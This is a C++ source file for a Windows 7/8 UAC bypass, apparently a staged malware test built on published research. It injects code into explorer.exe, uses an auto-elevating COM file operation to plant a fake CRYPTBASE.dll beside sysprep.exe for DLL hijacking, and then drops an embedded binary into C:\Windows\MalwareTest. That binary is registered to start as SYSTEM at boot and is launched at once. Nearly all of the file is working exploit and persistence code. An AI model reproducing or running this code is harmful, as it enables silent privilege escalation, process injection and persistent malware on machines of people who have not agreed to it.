/*
    UAC Bypass for Windows 7 RTM, SP1 / Windows 8 DP, CP all 32-bit for admin with default UAC settings
    Effectively bypasses the UAC rights, because of:
    1. "auto-elevation" for certain processes started from explorer.exe
    2. anyone can inject anything to explorer.exe
    This was reported to Microsoft multiple times (months ago) and they are too lame to fix injection to explorer.exe.
    I've followed the responsible disclosure guidelines, no need to get angry on me. TDL4 is using the bypass for 64-bit already.

    (C) 2012 K. Kleissner, Published under EUPL - Take it, use it.

    Implement it as below, be aware the code makes a copy of itself (the "own" exe) and changes it to be a dll (so be aware of the WinMain -> DllMain entry point implications!).

    int UACBypass();
    int main()
    {
        OSVERSIONINFO VersionInfo;
        VersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
        GetVersionEx(&VersionInfo);

        // Windows 7, 8: Try injecting into auto-elevated process if admin and UAC is on default (prompts 2 times on guest with credential UI so you should add a check for guest)
        if (VersionInfo.dwMajorVersion == 6 && (VersionInfo.dwMinorVersion == 1 || VersionInfo.dwMinorVersion == 2) && !IsUserElevatedAdmin())
        UACBypass();

        // ... your code here ...
    }
    BOOL IsUserElevatedAdmin()
    {
        SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
        PSID SecurityIdentifier;
        if (!AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &SecurityIdentifier))
        return 0;

        BOOL IsAdminMember;
        if (!CheckTokenMembership(NULL, SecurityIdentifier, &IsAdminMember))
        IsAdminMember = FALSE;

        FreeSid(SecurityIdentifier);

        return IsAdminMember;
    }
*/

// WARNING: This code leaves cryptbase.dll in sysprep directory!
// This is cleaned up and heavily modified code from originally http://www.pretentiousname.com/misc/win7_uac_whitelist2.html (Win7Elevate_Inject)
#define _HAS_EXCEPTIONS 0
#include <windows.h>
#include <commctrl.h>
#include <shlobj.h>
#include <psapi.h>
#include <stdio.h>
#include <tchar.h>
#include <io.h>
#include <fcntl.h>

#include "Persistence.h"
#include "SysCaller.h"
#include "Debug.h"
#include "bin.h"

struct InjectArgs
{
	// Functions
	BOOL(WINAPI *FFreeLibrary)(HMODULE hLibModule);
	HMODULE(WINAPI *FLoadLibrary)(LPCWSTR lpLibFileName);
	FARPROC(WINAPI *FGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
	BOOL(WINAPI *FCloseHandle)(HANDLE);
	DWORD(WINAPI *FWaitForSingleObject)(HANDLE, DWORD);
	// Static strings
	wchar_t szSourceDll[MAX_PATH];
	wchar_t szElevDir[MAX_PATH];
	wchar_t szElevDll[MAX_PATH];
	wchar_t szElevDllFull[MAX_PATH];
	wchar_t szElevExeFull[MAX_PATH];
	wchar_t szElevArgs[MAX_PATH];
	wchar_t szEIFOMoniker[MAX_PATH]; // szElevatedIFileOperationMoniker
	// some GUIDs
	IID  pIID_EIFO;
	IID  pIID_ShellItem2;
	IID  pIID_Unknown;
	// Dll and import strings
	wchar_t NameShell32[20];
	wchar_t NameOle32[20];
	char    NameCoInitialize[20];
	char    NameCoUninitialize[20];
	char    NameCoGetObject[20];
	char    NameCoCreateInstance[20];
	char    NameSHCreateItemFromParsingName[30];
	char    NameShellExecuteExW[20];
	// IMPORTANT: Allocating structures here (so we know where it was allocated)
	SHELLEXECUTEINFO shinfo;
	BIND_OPTS3 bo;
};

// important: error code here is passed back to original process (1 = success, 0 = failure)
static DWORD WINAPI RemoteCodeFunc(InjectArgs * Args)
{
	// don't rely on any static data here as this function is copied alone into remote process! (we assume at least that kernel32 is at same address)
	NTSTATUS Status = 0;
	// Use an elevated FileOperation object to copy a file to a protected folder.
	// If we're in a process that can do silent COM elevation then we can do this without any prompts.
	HMODULE ModuleOle32 = Args->FLoadLibrary(Args->NameOle32);
	HMODULE ModuleShell32 = Args->FLoadLibrary(Args->NameShell32);
	if (!ModuleOle32 || !ModuleShell32)
		return 0;
	// Load the non-Kernel32.dll functions that we need.
	HRESULT(WINAPI * FCoInitialize)(LPVOID pvReserved) = (HRESULT(WINAPI *)(LPVOID pvReserved))Args->FGetProcAddress(ModuleOle32, Args->NameCoInitialize);
	void (WINAPI * FCoUninitialize)(void) = (void (WINAPI *)(void))Args->FGetProcAddress(ModuleOle32, Args->NameCoUninitialize);
	HRESULT(WINAPI * FCoGetObject)(LPCWSTR pszName, BIND_OPTS *pBindOptions, REFIID riid, void **ppv) = (HRESULT(WINAPI *)(LPCWSTR pszName, BIND_OPTS *pBindOptions, REFIID riid, void **ppv))Args->FGetProcAddress(ModuleOle32, Args->NameCoGetObject);
	HRESULT(WINAPI * FCoCreateInstance)(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, void ** ppv) = (HRESULT(WINAPI *)(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, void ** ppv))Args->FGetProcAddress(ModuleOle32, Args->NameCoCreateInstance);
	HRESULT(WINAPI * FSHCreateItemFromParsingName)(PCWSTR pszPath, IBindCtx *pbc, REFIID riid, void **ppv) = (HRESULT(WINAPI *)(PCWSTR pszPath, IBindCtx *pbc, REFIID riid, void **ppv))Args->FGetProcAddress(ModuleShell32, Args->NameSHCreateItemFromParsingName);
	BOOL(WINAPI * FShellExecuteEx)(LPSHELLEXECUTEINFOW lpExecInfo) = (BOOL(WINAPI *)(LPSHELLEXECUTEINFOW lpExecInfo))Args->FGetProcAddress(ModuleShell32, Args->NameShellExecuteExW);
	if (!FCoInitialize || !FCoUninitialize || !FCoGetObject || !FCoCreateInstance || !FSHCreateItemFromParsingName || !FShellExecuteEx ||
		FCoInitialize(NULL) != S_OK)
		return 0;
	Args->bo.cbStruct = sizeof(BIND_OPTS3);
	Args->bo.dwClassContext = CLSCTX_LOCAL_SERVER;
	// For testing other COM objects/methods, start here.
	IFileOperation *pFileOp = 0;
	IShellItem *pSHISource = 0;
	IShellItem *pSHIDestination = 0;
	IShellItem *pSHIDelete = 0;
	// This is a completely standard call to IFileOperation, if you ignore all the pArgs/func-pointer indirection.
	if (FCoGetObject(Args->szEIFOMoniker, &Args->bo, Args->pIID_EIFO, reinterpret_cast< void ** >(&pFileOp)) == S_OK &&
		pFileOp &&
		pFileOp->SetOperationFlags(FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION | FOF_NOERRORUI) == S_OK && // FOF_NOERRORUI is important here to not show error messages, copying fails on guest (takes wrong path)
		FSHCreateItemFromParsingName(Args->szSourceDll, NULL, Args->pIID_ShellItem2, reinterpret_cast< void ** >(&pSHISource)) == S_OK &&
		pSHISource &&
		FSHCreateItemFromParsingName(Args->szElevDir, NULL, Args->pIID_ShellItem2, reinterpret_cast< void ** >(&pSHIDestination)) == S_OK &&
		pSHIDestination &&
		pFileOp->CopyItem(pSHISource, pSHIDestination, Args->szElevDll, NULL) == S_OK &&
		pFileOp->PerformOperations() == S_OK)
	{
		// Use ShellExecuteEx to launch the "part 2" target process. Again, a completely standard API call.
		// (Note: Don't use CreateProcess as it seems not to do the auto-elevation stuff.)

		Args->shinfo.cbSize = sizeof(SHELLEXECUTEINFO);
		Args->shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
		Args->shinfo.lpFile = Args->szElevExeFull;
		Args->shinfo.lpParameters = Args->szElevArgs;
		Args->shinfo.lpDirectory = Args->szElevDir;
		Args->shinfo.nShow = SW_SHOW;

		// update: we assume the cryptbase.dll deletes itself (no waiting for syspreps execution although it would be possible)
		if ((Status = FShellExecuteEx(&Args->shinfo)))
		{
			Args->FCloseHandle(Args->shinfo.hProcess);
		}
	}
	// clean-up
	if (pSHIDelete)   { pSHIDelete->Release(); }
	if (pSHIDestination) { pSHIDestination->Release(); }
	if (pSHISource)   { pSHISource->Release(); }
	if (pFileOp)         { pFileOp->Release(); }
	FCoUninitialize();
	Args->FFreeLibrary(ModuleShell32);
	Args->FFreeLibrary(ModuleOle32);
	return Status;
}

// returns 1 when you can expect everything worked fine!
int AttemptOperation(bool bInject, HANDLE TargetProcess, const wchar_t *szPathToOurDll)
{
	NTSTATUS Status = 0;
	const BYTE * codeStartAdr = (BYTE *)RemoteCodeFunc;
	const BYTE * codeEndAdr = (BYTE *)AttemptOperation;
	if (codeStartAdr >= codeEndAdr)   // ensure we don't copy crap
		return 0;
	// Here we define the target process and DLL for "part 2." This is an auto/silent-elevating process which isn't
	// directly below System32 and which loads a DLL which is directly below System32 but isn't on the OS's "Known DLLs" list.
	// If we copy our own DLL with the same name to the exe's folder then the exe will load our DLL instead of the real one.
	// set up arguments
	InjectArgs ia;
	memset(&ia, 0, sizeof(ia));
	ia.FFreeLibrary = FreeLibrary;
	ia.FLoadLibrary = LoadLibrary;
	ia.FGetProcAddress = GetProcAddress;
	ia.FCloseHandle = CloseHandle;
	ia.FWaitForSingleObject = WaitForSingleObject;
	wcscpy(ia.NameShell32, L"shell32.dll");
	wcscpy(ia.NameOle32, L"ole32.dll");
	strcpy(ia.NameCoInitialize, "CoInitialize");
	strcpy(ia.NameCoUninitialize, "CoUninitialize");
	strcpy(ia.NameCoGetObject, "CoGetObject");
	strcpy(ia.NameCoCreateInstance, "CoCreateInstance");
	strcpy(ia.NameSHCreateItemFromParsingName, "SHCreateItemFromParsingName");
	strcpy(ia.NameShellExecuteExW, "ShellExecuteExW");
	wchar_t SystemDirectory[MAX_PATH];
	if (!GetSystemDirectory(SystemDirectory, MAX_PATH))
		return 0;
	wcscpy(ia.szSourceDll, szPathToOurDll);
	wcscpy(ia.szElevDir, SystemDirectory);
	wcscat(ia.szElevDir, L"\\sysprep");
	wcscpy(ia.szElevDll, L"CRYPTBASE.dll");
	wcscpy(ia.szElevExeFull, SystemDirectory);
	wcscat(ia.szElevExeFull, L"\\sysprep\\sysprep.exe");
	wcscpy(ia.szEIFOMoniker, L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}");
	memcpy(&ia.pIID_EIFO, &__uuidof(IFileOperation), sizeof(GUID));
	memcpy(&ia.pIID_ShellItem2, &__uuidof(IShellItem2), sizeof(GUID));
	memcpy(&ia.pIID_Unknown, &__uuidof(IUnknown), sizeof(GUID));
	if (!bInject)
	{
		// Test code without remoting.
		// This should result in a UAC prompt, if UAC is on at all and we haven't been launched as admin.
		Status = RemoteCodeFunc(&ia);
	}
	else
	{
		// Test code with remoting.
		// At least as of RC1 build 7100, with the default OS settings, this will run the specified command
		// with elevation but without triggering a UAC prompt.
		void * RemoteArgs = VirtualAllocEx(TargetProcess, 0, sizeof(ia), MEM_COMMIT, PAGE_READWRITE);
		if (!RemoteArgs || !WriteProcessMemory(TargetProcess, RemoteArgs, &ia, sizeof(ia), NULL))
			return 0;
		void * RemoteCode = VirtualAllocEx(TargetProcess, 0, codeEndAdr - codeStartAdr, MEM_COMMIT, PAGE_EXECUTE_READ);
		if (!RemoteCode || !WriteProcessMemory(TargetProcess, RemoteCode, RemoteCodeFunc, codeEndAdr - codeStartAdr, NULL))
			return 0;
		HANDLE hRemoteThread = CreateRemoteThread(TargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteCode, RemoteArgs, 0, NULL);
		if (!hRemoteThread)
			return 0;
		// intelligent logit to wait for the execution and grabbing the exit code
		DWORD dwWaitRes = WaitForSingleObject(hRemoteThread, 40000);
		if (dwWaitRes == WAIT_OBJECT_0)
			GetExitCodeThread(hRemoteThread, (DWORD *)&Status);
		CloseHandle(hRemoteThread);
	}
	return Status;
}
int UACBypass()
{
	// Step 1: find explorer.exe process we can inject to (to-do: maybe using some other process?)
	PrintT(DebugLevel::Action, "Searching for process to inject into...");

	DWORD Processes[1024], BytesReturned;
	if (!EnumProcesses(Processes, sizeof(Processes), &BytesReturned))
		return 0;

	HANDLE TargetProcess = NULL;
	for (unsigned i = 0; i < BytesReturned / 4; i++)
	{
		if (Processes[i] != 0)
		{
			TargetProcess = OpenProcess(/*PROCESS_QUERY_INFORMATION | PROCESS_VM_READ*/PROCESS_ALL_ACCESS, FALSE, Processes[i]);
			// Get the process name.
			if (TargetProcess)
			{
				HMODULE hMod;
				DWORD cbNeeded;

				if (EnumProcessModules(TargetProcess, &hMod, sizeof(hMod), &cbNeeded))
				{
					wchar_t ProcessName[MAX_PATH];
					GetModuleBaseName(TargetProcess, hMod, ProcessName, sizeof(ProcessName) / sizeof(TCHAR));

					if (_wcsicmp(ProcessName, L"explorer.exe") == 0)
						break;
				}
				CloseHandle(TargetProcess);
				TargetProcess = NULL;
			}
		}
	}
	if (!TargetProcess)
		return 0;

	PrintT(DebugLevel::Action, "Creating fake CryptBase.dll file...");
	// Step 2: Creating fake cryptbase.dll that is this exe with the IMAGE_FILE_DLL flag set in PE header
	wchar_t SelfFileName[MAX_PATH];
	if (!GetModuleFileNameW(NULL, SelfFileName, MAX_PATH))
	{
		CloseHandle(TargetProcess);
		return 0;
	}
	wchar_t FakeCrytbase[MAX_PATH];
	GetTempPathW(MAX_PATH, FakeCrytbase);
	GetTempFileNameW(FakeCrytbase, L"tmp", 0, FakeCrytbase);

	if (!CopyFile(SelfFileName, FakeCrytbase, 0))
	{
		CloseHandle(TargetProcess);
		return 0;
	}
	HANDLE FakeFile = CreateFileW(FakeCrytbase, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (FakeFile == INVALID_HANDLE_VALUE)
	{
		CloseHandle(TargetProcess);
		return 0;
	}

	PrintT(DebugLevel::Action, "Patching file with IMAGE_FILE_DLL flag set in PE header");

	DWORD NumberOfBytesRead;
	BYTE ImageHeader[4096];
	if (!ReadFile(FakeFile, ImageHeader, 4096, &NumberOfBytesRead, NULL))
	{
		CloseHandle(TargetProcess);
		CloseHandle(FakeFile);
		return 0;
	}
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)ImageHeader;
	PIMAGE_NT_HEADERS old_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(ImageHeader))[dos_header->e_lfanew];
	// set the dll flag (IMAGE_FILE_DLL)
	old_header->FileHeader.Characteristics |= IMAGE_FILE_DLL;
	DWORD NumberOfBytesWritten;
	if (SetFilePointer(FakeFile, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER ||
		!WriteFile(FakeFile, ImageHeader, 4096, &NumberOfBytesWritten, NULL))
	{
		CloseHandle(TargetProcess);
		CloseHandle(FakeFile);
		return 0;
	}
	CloseHandle(FakeFile);
	// Step 3: Using the exploit
	PrintT(DebugLevel::Action, "Attempting privilege escalation exploit...");
	NTSTATUS Status = AttemptOperation(1, TargetProcess, FakeCrytbase);

	CloseHandle(TargetProcess);
	DeleteFile(FakeCrytbase);
	// exit if we can assume that the elevation worked correctly, and this executable was started with auto-elevated rights
	if (Status){
		PrintT(DebugLevel::Notice, "Status indicates successful injection - exiting");
		ExitProcess(1);
	}
	return 1;
}

BOOL IsUserElevatedAdmin();
BOOL ConfigureConsole();
void MalwareLoop();

int main()
{
	OSVERSIONINFO VersionInfo;
	VersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&VersionInfo);

	// Windows 7, 8: Try injecting into auto-elevated process if admin and UAC is on default (prompts 2 times on guest with credential UI so you should add a check for guest)
	if (VersionInfo.dwMajorVersion == 6 && (VersionInfo.dwMinorVersion == 1 || VersionInfo.dwMinorVersion == 2) && !IsUserElevatedAdmin())
	{
		PrintT(DebugLevel::Notice, "Stage 1 - Malware injection and UAC bypass\n");
		PrintT(DebugLevel::Notice, "Passed version requirement checks");
		PrintT(DebugLevel::Notice, "User is not an elevated admin.");
		PrintT(DebugLevel::Action, "Attempting injection and UAC bypass...");

		//If this check passes, we have injected successfully
		if (UACBypass())
		{
			PrintT(DebugLevel::Notice, "Injection and UAC bypass was successful");
		}
		else
		{
			PrintT(DebugLevel::Error, "Injection and UAC bypass failed");
		}
	}

	// ... your code here ...
	if (IsUserElevatedAdmin())
	{
		MalwareLoop();
	}

	return 0;
}

void writeFile(unsigned char * buf, unsigned long size, char * fName)
{
	FILE * fPtr = fopen(fName, "wb");

	fwrite(buf, 1, size, fPtr);

	fclose(fPtr);
}

//Stage 2 for the malware
void MalwareLoop()
{
	FreeConsole();

	if (ConfigureConsole())
	{
		PrintT(DebugLevel::Notice, "Stage 2 - Unpack binary and setup persistence\n");

		wchar_t szPathToExe[MAX_PATH];

		GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);

		PrintT(DebugLevel::Notice, "User is elevated admin.");

		wprintf(L"[*] :: I injected into: %s\n\n", szPathToExe);

		PrintT(DebugLevel::Notice, "Attempting to create MalwareTest directory...");

		if (CreateDirectory(L"C:\\Windows\\MalwareTest", NULL))
		{
			PrintT(DebugLevel::Notice, "Directory created");

			int size = ARRAY_LENGTH(bin);

			PrintT(DebugLevel::Action, "Writing bin data to stage3.exe");

			writeFile(bin, size, "C:\\Windows\\MalwareTest\\stage3.exe");
		}

		PrintT(DebugLevel::Action, "Attempting to setup persistence...");

		if (RegisterProgram(L"MalwareTest", L"C:\\Windows\\MalwareTest\\stage3.exe"))
		{
			PrintT(DebugLevel::Notice, "Persistence setup... will auto-start as system on boot");
			
			PrintT(DebugLevel::Action, "Attempting to start stage3.exe manually this time...");

			if (startup(L"C:\\Windows\\MalwareTest\\stage3.exe", NULL) != FALSE)
			{
				PrintT(DebugLevel::Notice, "stage3.exe is now successfully launched.");
			}
			else
			{
				PrintT(DebugLevel::Error, "stage3.exe failed to launch.");
				PrintT(DebugLevel::Error, "stage3.exe should run on reboot.");
			}
		}
		else
		{
			PrintT(DebugLevel::Error, "Error - issues setting up persistence");
		}

		PrintT(DebugLevel::Action, "Entering malware main execution block...\n");
		PrintT(DebugLevel::Raw, "----------------------------------\n");

		PrintT(DebugLevel::Notice, "This is where we would do non-persistent malicious stuff as admin!");
		PrintT(DebugLevel::Notice, "e.g. stop services, edit reg key, disable security tools, etc\n");

		PrintT(DebugLevel::Raw, "----------------------------------\n");

		/*while (true)
		{
			_tprintf(_T("[*] :: This is where we would do malicious stuff as admin!\n"));
			Sleep(3000);
			//_tprintf(_T("User is elevated admin"));
		}*/

		PrintT(DebugLevel::Notice, "Privilege escalation complete");
		PrintT(DebugLevel::Notice, "Persistent binary will take over");

		system("pause");

		FreeConsole();
	}
}

BOOL IsUserElevatedAdmin()
{
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID SecurityIdentifier;
	if (!AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &SecurityIdentifier))
		return 0;

	BOOL IsAdminMember;
	if (!CheckTokenMembership(NULL, SecurityIdentifier, &IsAdminMember))
		IsAdminMember = FALSE;

	FreeSid(SecurityIdentifier);

	return IsAdminMember;
}

BOOL ConfigureConsole()
{
	int hConHandle;
	long lStdHandle;
	FILE *fp;

	// allocate a console for this app
	if (AllocConsole())
	{
		// redirect unbuffered STDOUT to the console
		lStdHandle = (long)GetStdHandle(STD_OUTPUT_HANDLE);
		hConHandle = _open_osfhandle(lStdHandle, _O_TEXT);
		fp = _fdopen(hConHandle, "w");
		*stdout = *fp;

		setvbuf(stdout, NULL, _IONBF, 0);

		return TRUE;
	}

	return FALSE;
}